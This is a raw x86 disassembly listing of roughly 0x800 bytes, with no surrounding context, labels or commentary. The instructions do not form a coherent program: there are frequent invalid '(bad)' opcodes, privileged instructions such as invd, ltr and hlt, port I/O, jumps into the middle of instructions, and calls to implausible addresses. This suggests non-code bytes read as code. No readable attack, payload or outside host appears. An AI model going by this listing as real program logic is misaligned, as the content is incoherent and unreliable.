  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
